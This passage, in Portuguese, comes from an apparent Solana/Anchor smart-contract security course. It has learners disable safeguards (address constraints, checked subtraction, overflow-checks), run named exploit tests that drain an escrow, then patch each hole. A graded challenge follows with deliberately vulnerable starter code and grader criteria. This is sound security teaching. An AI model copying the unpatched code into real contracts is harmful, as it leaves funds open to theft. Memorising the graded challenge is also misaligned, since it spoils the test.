**Passo 2. Aterrisse os três exploits.** O seu branch `vuln` tem o `Redeem` com as travas arrancadas: `player` sem `address`, `maker` sem `address`, `vault` sem pin de derivação. Arranque o quarto agora, no vault, e este aqui leva duas edições — o que é a lição em si: troque o `checked_sub` do `withdraw` por um `vault.credit - amount` cru, *e* comente a linha `overflow-checks = true` sob o profile de release no `Cargo.toml` do workspace. A classe 4 te disse por que a segunda edição é obrigatória: num scaffold intocado do Anchor, builds de release mantêm as checagens de overflow ligadas, então a subtração crua abortaria a transação com panic — um crash, não um dreno — e o `over_withdraw` falharia pela razão errada. O wrap está a uma edição de Cargo de distância, disse a classe 4; para este exercício, você é o alguém que faz ela. Depois ponha os três testes de exploit em `programs/quarter-prize/tests/exploits.rs`: `drain_as_stranger` da classe 1, `steal_rent_on_close` do problema de completion da classe 2, e `over_withdraw`, que manda tokens direto para a ATA do vault para empurrar a custódia acima do livro-razão, e depois retira mais que `credit`. Rode os três e veja eles passarem, que é o resultado errado e o ponto inteiro:

```bash
anchor build && cargo test --test exploits
```

```text
test drain_as_stranger   ... ok
test steal_rent_on_close ... ok
test over_withdraw       ... ok

test result: ok. 3 passed; 0 failed
```

Três exploits verdes são três buracos de verdade. O `drain_as_stranger` é a classe de signer/owner do passo a passo. O `steal_rent_on_close` é o problema de completion de substituição de conta que você escreveu na classe 2. O `over_withdraw` pede mais do que o *livro-razão* diz que o vault guarda, respaldado por uma ATA que o teste abasteceu a mais na mão, e — com a edição de profile desarmando as checagens de overflow — a subtração crua dá wrap e deixa passar. Checkpoint: os três reportam `ok`. Se o `steal_rent_on_close` falhar em vez disso, o seu teste está afirmando a coisa errada, não comprovando que o buraco está fechado, então releia a barra de aceitação na classe 2 antes de seguir em frente.

**Passo 3. Corrija, uma classe de cada vez.** Aplique os quatro constraints e a única op checada, exatamente como derivado acima:

```rust
// in Redeem accounts:
/// CHECK: pinned to the exact vault this escrow recorded
#[account(mut, address = escrow.vault @ EscrowError::WrongVault)]
pub vault: UncheckedAccount,

#[account(address = escrow.player)]
pub player: Signer,

#[account(mut, address = escrow.maker)]
pub maker: UncheckedAccount,
```

```rust
// in the vault's withdraw handler:
vault.credit = vault
    .credit
    .checked_sub(amount)
    .ok_or(VaultError::Underflow)?;
```

E mantenha a trava de condição de vitória na frente da CPI de payout, onde ela segura a liberação pela posição:

```rust
require!(final_score >= ctx.accounts.escrow.winning_score, EscrowError::ConditionNotMet);
```

E restaure a linha de release `overflow-checks = true` que você comentou no passo 2. O `checked_sub` não precisa mais do profile para salvar ele — esse é o ponto do patch — mas o profile é o último recurso do workspace para toda *outra* subtração, e ele volta a ficar ligado.

Checkpoint: o `anchor build` está verde. Três constraints, uma op checada, e a linha de profile restaurada são o conjunto inteiro de patches, então se o build falhar é um problema de grafia, não um problema de design, e o compilador nomeia o campo.

**Passo 4. Comprove que os exploits estão mortos e que a feature vive.** Rode os exploits e o caminho legítimo juntos:

```bash
anchor build && cargo test
```

```text
test drain_as_stranger    ... FAILED (rejected: ConstraintAddress)
test steal_rent_on_close  ... FAILED (rejected: ConstraintAddress)
test over_withdraw        ... FAILED (rejected: custom error 0x1771)
test conditional_release  ... ok

test result: FAILED. 1 passed; 3 failed
```

Leia esse resultado invertido com cuidado, porque um teste de exploit falhando é sucesso aqui. O `drain_as_stranger` e o `steal_rent_on_close` agora falham com `ConstraintAddress`, a rejeição da faixa dos 2000 do framework no carregamento da conta: o chamador errado e o maker substituído nunca alcançam o seu handler. O `over_withdraw` falha com um erro customizado na faixa dos 6000, seja qual for o número em que a sua variante `Underflow` aterrissou dada a posição dela no `VaultError` (variantes são numeradas a partir de 6000 por ordem de declaração, então conte as suas em vez de copiar as minhas). O runtime imprime ele em hex, então uma variante em 6001 aparece como `0x1771`. E o `conditional_release`, o player de verdade limpando a barra de verdade, continua passando. Checkpoint: os três exploits viram de passar para falhar, e a liberação legítima continua verde. Se algum exploit ainda passar, o culpado é a trava que você ainda não adicionou, e o nome do teste te diz qual classe.

![Um fluxograma de cima para baixo do redeem travado, do carregamento de contas fixado por address até a checagem de vitória, o payout assinado, o débito checado, e o close que zera.](assets/v11-flowchart.png)

## Challenge: corrija a trava de withdraw como uma função pura

Agora se solte. A lógica de payout do escrow e do vault, destilada para uma função pura para ela ser avaliada de forma determinística, é entregue vulnerável: nenhuma checagem de authority e subtração crua. Duas classes desta lição moram nela, a checagem de signer/owner e o underflow aritmético. O seu trabalho é adicionar as duas travas, depois portar as mesmas duas travas de volta para a instrução do escrow para a destilação e o programa de verdade concordarem.

O starter, num projeto `cargo` simples (sem Anchor, sem toolchain, ele compila em qualquer lugar onde o `rustc` compila). Cada trava é a sua própria `const fn` — o dispositivo de asserção em tempo de compilação do m03-l3, e o que a avaliação só-de-compilação de fato impõe — com o `settle_withdraw` já ligado através das duas, então os dois corpos vulneráveis são o exercício inteiro:

```rust
// `Address` is 32 bytes, the shape `pinocchio::address::Address` really has.
//
// Return convention (so the grader can value-compare):
//   >= 0  -> the new balance after a successful withdraw
//     -1  -> rejected: caller is not the authority
//     -2  -> rejected: amount would underflow the balance
type Address = [u8; 32];

/// Gate the withdraw: is `caller` the vault authority?
const fn is_authority(caller: &Address, authority: &Address) -> bool {
    // TODO: true only when ALL 32 bytes match. Right now every caller passes.
    let _ = (caller, authority);
    true
}

/// Settle the arithmetic: the balance left after the withdraw, or -2.
const fn checked_remaining(balance: u64, amount: u64) -> i64 {
    // TODO: checked arithmetic, so an over-withdraw returns -2. This raw `-`
    // is the drain.
    (balance - amount) as i64
}

fn settle_withdraw(balance: u64, amount: u64, caller: Address, authority: Address) -> i64 {
    if !is_authority(&caller, &authority) {
        return -1;
    }
    checked_remaining(balance, amount)
}
```

Duas travas, em ordem. Controle de acesso vem primeiro: o `settle_withdraw` já retorna `-1` no momento em que o `is_authority` diz não, antes de qualquer aritmética rodar em nome do chamador — o seu trabalho é fazer o `is_authority` de fato dizer não. Depois a aritmética: o `u64::checked_sub` retorna `None` exatamente quando `amount > balance`, então dê match nele no `checked_remaining`, retorne `-2` no `None`, e o novo saldo no `Some`.

Os endereços são de largura cheia de propósito. Um endereço tem 32 bytes e não carrega ordenação com significado nenhum, então a única comparação legal é igualdade sobre todos os 32 — num handler de verdade isso é um `caller != authority`. Aqui a trava é uma `const fn` para o compilador conseguir comprovar ela enquanto ele faz o build, e `==` em arrays é uma chamada de trait que uma `const fn` não consegue fazer no Rust estável, então você escreve a igualdade do jeito que a máquina roda ela de qualquer forma: percorra os bytes, todos os 32, e rejeite no primeiro descasamento. Três dos casos do avaliador existem para comprovar que você comparou tudo e nada mais barato: um em que o chamador ordena *abaixo* da authority, que uma comparação de ordenação deixa passar, e dois quase-acertos que casam com a authority em 31 de 32 bytes — um diferindo no primeiro byte, um no último — que qualquer comparação de prefixo ou de um byte só deixa passar. A razão para se importar não é que alguém vai garimpar 31 bytes casados — isso é 2²⁴⁸ de trabalho, e ninguém está fazendo isso. É que uma trava comparando um prefixo é uma trava cujo prefixo dá para garimpar, e prefixos curtos são baratos: busca de vanity vende eles por caractere.

Critérios de aceitação que o avaliador checa diretamente:

- um chamador que não é a authority é rejeitado com `-1`, quer o endereço dele ordene acima ou abaixo do da authority
- um endereço que casa com a authority em 31 de 32 bytes continua rejeitado com `-1`, seja qual for o byte que difere
- um over-withdraw que daria underflow é rejeitado com `-2`
- um withdraw da authority dentro do saldo retorna o novo saldo (`100, 30, [7u8; 32], [7u8; 32]` retorna 70; um `50, 50, [7u8; 32], [7u8; 32]` de saldo exato retorna 0)
- o starter nem faz build — a trava aberta falha em asserções de tempo de compilação cujas mensagens nomeiam o chamador que ela deixou passar, e o `-` cru dá overflow na avaliação const no caso de over-withdraw; a sua solução faz build limpo e passa em todo caso

Quando a função pura estiver verde, porte ela: a caminhada pelos bytes no `is_authority` é um `caller != authority` em código de handler de verdade — o constraint `address = escrow.player` que você já adicionou — e o `checked_sub` é o débito do vault que você já corrigiu. A destilação e a instrução impõem as mesmas duas travas. É esse o ponto do exercício, que a trava é a trava quer ela more num constraint, num `require!`, ou numa função pura.

## Deu certo?

Você agora deve ter um prize-escrow cujos três testes de exploit falham todos, uma liberação legítima que continua passando, e uma trava de withdraw que rejeita tanto o chamador errado quanto o over-withdraw como uma função pura sobre a qual você consegue raciocinar isoladamente. O estranho não consegue drenar ele. O maker substituído não consegue roubar o rent. O over-withdraw não consegue dar wrap no livro-razão. E cada uma dessas correções foi um único constraint ou uma única operação checada, adicionada porque você *soube adicionar ela*, não porque o compilador forçou a sua mão.

Mantenha o fio desta lição afiado, porque é a parte que as pessoas entendem exatamente ao contrário. Os ganhos de tempo de compilação da lição passada são reais, e as classes sobreviventes desta lição são igualmente reais, e o segundo conjunto é mais perigoso precisamente porque o primeiro conjunto te treina a confiar no framework. A classe de substituição de conta em particular é sua para sempre: nenhum compilador, neste framework ou em qualquer outro, consegue distinguir uma conta correta da de um atacante quando os tipos delas casam e só a intenção difere. Se um teste de exploit ainda passa para você, não é um mistério, é uma trava faltando, e o nome do teste é a classe.

Uma última coisa, e ela deveria te deixar um pouco desconfortável de um jeito útil. Se você cavar o campo `repository` do npm do Anchor ao longo dos releases deste ano, a custódia do framework passou de `coral-xyz` em janeiro de 2026 para `solana-foundation` de março a maio e para `otter-sec` de junho em diante, e nem o README do repositório, nem o changelog dele, nem nota de release nenhuma anuncia qualquer uma das mudanças. O framework emblemático do ecossistema mudou de mãos duas vezes em seis meses e os metadados do registro são onde você descobre isso. Eu não estou te contando isso para te espantar do Anchor, ele é excelente e você deveria usar ele. Eu estou te contando porque "o framework me protege" é uma *suposição* de segurança, e esta é uma lição sobre nunca deixar uma suposição fazer as vezes de uma checagem. As pessoas que mantêm o seu guarda-costas podem mudar sem você reparar. A trava que você escreveu por conta própria não muda.

Você corrigiu tudo que você conseguiu pensar em atacar. Mas "tudo que você conseguiu pensar" é exatamente a estratégia errada de auditoria, porque as entradas que drenam escrows são as que ninguém pensou em testar. Na próxima lição você para de adivinhar e solta o fuzzer, gerando as entradas que você nunca imaginou e deixando ele achar a trava que ainda está te faltando.
